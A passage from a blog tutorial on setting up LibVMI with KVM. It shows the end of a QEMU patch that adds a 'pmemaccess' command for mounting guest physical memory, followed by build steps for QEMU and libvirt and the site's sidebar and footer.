error_exit;</div><div class="line">+  &#125;</div><div class="line">+  printf("in memory_access_thread : %d\n", socket_fd);</div><div class="line">+  if (listen(socket_fd, 0) != 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: listen failed\n");</div><div class="line">+    goto error_exit;</div><div class="line">+  &#125;</div><div class="line">+</div><div class="line">+  connection_fd = accept(socket_fd, (struct sockaddr *) &amp;address, &amp;address_length);</div><div class="line">+  connection_handler(connection_fd);</div><div class="line">+</div><div class="line">+  close(socket_fd);</div><div class="line">+  unlink(path);</div><div class="line">+error_exit:</div><div class="line">+  return NULL;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  int</div><div class="line">+memory_access_start (const char *path)</div><div class="line">+&#123;</div><div class="line">+  pthread_t thread;</div><div class="line">+  sigset_t set, oldset;</div><div class="line">+  int ret;</div><div class="line">+</div><div class="line">+  // create a copy of path that we can safely use</div><div class="line">+  char *pathcopy = malloc(strlen(path) + 1);</div><div class="line">+  memcpy(pathcopy, path, strlen(path) + 1);</div><div class="line">+</div><div class="line">+  // start the thread</div><div class="line">+  sigfillset(&amp;set);</div><div class="line">+  pthread_sigmask(SIG_SETMASK, &amp;set, &amp;oldset);</div><div class="line">+  ret = pthread_create(&amp;thread, NULL, memory_access_thread, pathcopy);</div><div class="line">+  pthread_sigmask(SIG_SETMASK, &amp;oldset, NULL);</div><div class="line">+</div><div class="line">+  return ret;</div><div class="line">+&#125;</div><div class="line">diff --git a/memory-access.h b/memory-access.h</div><div class="line">new file mode 100644</div><div class="line">index 0000000..e538134</div><div class="line">--- /dev/null</div><div class="line">+++ b/memory-access.h</div><div class="line">@@ -0,0 +1,8 @@</div><div class="line">+/*</div><div class="line">+ * Mount guest physical memory using FUSE.</div><div class="line">+ *</div><div class="line">+ * Copyright (C) 2011 Sandia National Laboratories</div><div class="line">+ * Author: Bryan D. Payne (bdpayne@acm.org)</div><div class="line">+ */</div><div class="line">+</div><div class="line">+int memory_access_start (const char *path);</div><div class="line">diff --git a/monitor.c b/monitor.c</div><div class="line">index 99bfcd9..7dd4ac2 100644</div><div class="line">--- a/monitor.c</div><div class="line">+++ b/monitor.c</div><div class="line">@@ -67,6 +67,7 @@</div><div class="line"> #include "qmp-commands.h"</div><div class="line"> #include "hmp.h"</div><div class="line"> #include "qemu/thread.h"</div><div class="line">+#include "memory-access.h"</div><div class="line"></div><div class="line"> /* for pic/irq_info */</div><div class="line"> #if defined(TARGET_SPARC)</div><div class="line">@@ -1252,6 +1253,14 @@ static void do_print(Monitor *mon, const QDict *qdict)</div><div class="line">     monitor_printf(mon, "\n");</div><div class="line"> &#125;</div><div class="line"></div><div class="line">+static int do_physical_memory_access(Monitor *mon, const QDict *qdict, QObject **ret_data)</div><div class="line">+&#123;</div><div class="line">+    const char *path = qdict_get_str(qdict, "path");</div><div class="line">+    printf("in do_physical_memory_access : %s\n", path);</div><div class="line">+    memory_access_start(path);</div><div class="line">+    return 0;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line"> static void do_sum(Monitor *mon, const QDict *qdict)</div><div class="line"> &#123;</div><div class="line">     uint32_t addr;</div><div class="line">diff --git a/qmp-commands.hx b/qmp-commands.hx</div><div class="line">index cf47e3f..41b3e1b 100644</div><div class="line">--- a/qmp-commands.hx</div><div class="line">+++ b/qmp-commands.hx</div><div class="line">@@ -610,6 +610,33 @@ Example:</div><div class="line"> EQMP</div><div class="line"></div><div class="line">     &#123;</div><div class="line">+        .name       = "pmemaccess",</div><div class="line">+        .args_type  = "path:s",</div><div class="line">+        .params     = "path",</div><div class="line">+        .help       = "mount guest physical memory image at 'path'",</div><div class="line">+        .user_print = monitor_user_noop,</div><div class="line">+        .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">+    &#125;,</div><div class="line">+</div><div class="line">+SQMP</div><div class="line">+pmemaccess</div><div class="line">+----------</div><div class="line">+</div><div class="line">+Mount guest physical memory image at 'path'.</div><div class="line">+</div><div class="line">+Arguments:</div><div class="line">+</div><div class="line">+- "path": mount point path (json-string)</div><div class="line">+</div><div class="line">+Example:</div><div class="line">+</div><div class="line">+-&gt; &#123; "execute": "pmemaccess",</div><div class="line">+             "arguments": &#123; "path": "/tmp/guestname" &#125; &#125;</div><div class="line">+&lt;- &#123; "return": &#123;&#125; &#125;</div><div class="line">+</div><div class="line">+EQMP</div><div class="line">+</div><div class="line">+    &#123;</div><div class="line">         .name       = "migrate",</div><div class="line">         .args_type  = "detach:-d,blk:-b,inc:-i,uri:s",</div><div class="line">         .mhandler.cmd_new = qmp_marshal_input_migrate,</div></pre></td></tr></table></figure></p>
<p>After we apply the Qemuu patch, we can re-compile the Qemu:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cd qemu</div><div class="line">$ ./configure</div><div class="line">$ make -jj4</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>In addition, as said in the Libvmi READM, you need to make sure your libvirt version is 0.8.7 or newer, and you should sure that the libvirt installation supports QMP commands, which can be done by install libyajl-dev (take my Debian as an example):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libyajl-dev</div><div class="line">$ cd libvirt</div><div class="line">$ ./configure</div></pre></td></tr></table></figure></p>
<p>And ensure that the configure script reports that it found yajl. Then you should compile the libvirt<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make -j4</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>After that, you can setup libvmi as before.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmikvm/" target="_blank" rel="external">Libvmi Setup</a>》</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div class="widget-wrap" style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 75%;">
            <span class="screen-reader-text">Search for:</span>
            <input type="search" class="search-field" style="height: 42px;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">集思广益</h3>
      <p>我们推崇的是黑客与分享精神，如果您觉得本站对您有帮助，不妨自己也参与进来共同建设，期待您能推荐好文章或投稿至本站，
让更多人受益。本站长期招募志愿者与勤工俭学者参与本站的维护和建设，您可通过邮件csyssec@hotmail.com联系我们</p>
       <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="null" title="Words"><i class="fa fa-words" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a> </li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>


        	</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新推荐</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/glibcmalloc/">深入理解glibc malloc</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/pinintro/">二进制代码注入PIN</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-memory/">KVM源码分析之内存虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-cpu/">KVM源码分析之CPU虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-create/">KVM源码分析之虚拟机的创建与运行</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-intro/">KVM源码分析之基本工作原理</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-gotgor/">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/rootkittutorial/">Rootkit综合教程</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/kvmqemuintro/">KVM/QEMU虚拟化简介</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmikvm/">KVM Support in Libvmi</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/libvmiintrospection/">Write Introspection Tools Using Libvmi</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类导航</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签导航</h3>
    <div class="widget tagcloud">
      <a href="/tags/ASLR/" style="font-size: 12px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 10px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 13px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 14px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11px;">Stack</a> <a href="/tags/System/" style="font-size: 19px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      版权所有&copy; 2017 Index of Computer System and Security 保留所有权利.
      </div>
      <div class="site-credit">
        自豪地使用 <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/syssec" class="mobile-nav-link">Syssec</a>
  
    <a href="/architecture" class="mobile-nav-link">Architecture</a>
  
    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
  
    <a href="/malware" class="mobile-nav-link">Malware</a>
  
    <a href="/conferences" class="mobile-nav-link">Conferences</a>
  
    <a href="/academy" class="mobile-nav-link">Academy</a>
  
    <a href="/celebrity" class="mobile-nav-link">Celebrity</a>
  
    <a href="/contribution" class="mobile-nav-link">Contribution</a>
  
    <a href="/donation" class="mobile-nav-link">Donation</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>





  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
  

  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
  </div>


</body>
</html>
